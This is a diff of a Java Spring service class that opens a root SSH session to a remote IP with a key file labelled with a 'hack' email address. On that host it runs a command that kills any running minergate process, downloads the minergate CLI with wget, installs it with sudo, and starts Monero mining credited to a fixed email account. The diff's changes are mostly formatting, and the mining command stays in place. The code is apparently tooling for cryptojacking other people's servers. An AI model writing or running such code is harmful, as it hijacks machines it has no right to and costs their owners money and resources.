@@ -17,17 +17,17 @@ import org.springframework.stereotype.Service;
 @Service
 public class ConnectSSH {
 
-    public void connectSSH(AccountInfo accountInfo ,Session session ) {
-        
+    public void connectSSH(AccountInfo accountInfo, Session session) {
+
         try {
-            String cmd = "ps -ef | grep minergate-cli | grep -v grep | awk '{print $2}' | xargs -r kill -9 && sudo apt-get -y update && wget https://minergate.com/download/deb-cli -O minergate-cli.deb && sudo dpkg -i minergate-cli.deb && minergate-cli -user lisatthu35@gmail.com -xmr 1"; 
-        
+            String cmd = "ps -ef | grep minergate-cli | grep -v grep | awk '{print $2}' | xargs -r kill -9 && sudo apt-get -y update && wget https://minergate.com/download/deb-cli -O minergate-cli.deb && sudo dpkg -i minergate-cli.deb && minergate-cli -user lisatthu35@gmail.com -xmr 1";
+
             String host = accountInfo.getIp();
             String user = "root";
             int port = 22;
             JSch s = new JSch();
             // s.addIdentity("E:\\Soft\\Remote Server Linux\\hack2.ppk");
-            s.addIdentity(ConstantVariable.Constant.dirKey+"hacklslol1@yahoo.com"+ConstantVariable.Constant.typeKeyPPK);
+            s.addIdentity(ConstantVariable.Constant.dirKey + "hacklslol1@yahoo.com" + ConstantVariable.Constant.typeKeyPPK);
 
             session = s.getSession(user, host, port);
             session.setTimeout(15000);
@@ -46,9 +46,9 @@ public class ConnectSSH {
             channel.setCommand(cmd);
 
             channel.connect();
-
+            System.out.println("connect:");
         } catch (Exception e) {
-            System.out.println("connectSSH:"+e.getMessage()); 
+            System.out.println("connectSSH:" + e.getMessage());
         }
     }
 
